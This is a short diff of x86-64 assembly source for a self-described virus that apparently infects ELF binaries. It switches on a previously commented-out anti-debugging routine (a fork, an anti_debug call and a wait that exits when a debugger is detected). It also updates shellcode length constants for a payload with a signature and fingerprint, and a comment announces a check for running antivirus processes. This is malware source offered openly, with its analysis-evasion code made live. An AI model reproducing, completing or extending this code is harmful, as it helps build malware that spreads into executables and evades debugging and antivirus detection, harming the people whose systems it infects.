@@ -27,25 +27,25 @@ _start:
 
 	;Let's make sure a debugger is not trying to analyze the virus
 
-;	mov rax, 57; fork
-;	syscall;rax = fork()
-;	cmp rax, 0
-;	jne wait_ad
-;	call anti_debug
-;	wait_ad:
-;	sub rsp, 4; STATUS SAVED HERE
-;	mov rdi, rax
-;	mov rsi, 0
-;	lea rsi, [rsp];store status in stack
-;	mov rdx, 0
-;	mov r10, 0
-;	mov rax, 61
-;	syscall; wait(pid/rax, &status, 0, 0, 0);
-;	mov rax, 0
-;	mov eax, DWORD[rsp]
-;	cmp rax, 0
-;	jne exit_prog
-;	add rsp, 4
+	mov rax, 57; fork
+	syscall;rax = fork()
+	cmp rax, 0
+	jne wait_ad
+	call anti_debug
+	wait_ad:
+	sub rsp, 4; STATUS SAVED HERE
+	mov rdi, rax
+	mov rsi, 0
+	lea rsi, [rsp];store status in stack
+	mov rdx, 0
+	mov r10, 0
+	mov rax, 61
+	syscall; wait(pid/rax, &status, 0, 0, 0);
+	mov rax, 0
+	mov eax, DWORD[rsp]
+	cmp rax, 0
+	jne exit_prog
+	add rsp, 4
 	;We wanna check that no program containning "antivirus" in it's name is running"
 	NOP
 	NOP
@@ -1718,9 +1718,9 @@ push rdx
 	NOP
 retn
 
-%define SHELLCODE_LEN 9447 ; 44 + 5 (jmp) + 12 (exit) + signature (40) + 116 (fingerprint)
-%define SHELLCODE_JMP_INDEX 9279 ; 44 + 5 (jmp)
-%define PURE_SHELLCODE_LEN 9274 
+%define SHELLCODE_LEN 9521 ; 44 + 5 (jmp) + 12 (exit) + signature (40) + 116 (fingerprint)
+%define SHELLCODE_JMP_INDEX 9353 ; 44 + 5 (jmp)
+%define PURE_SHELLCODE_LEN 9348 
 ; void parse64elf(void *file, int wfd, unsigned long fsize)
 parse64elf:
 	NOP
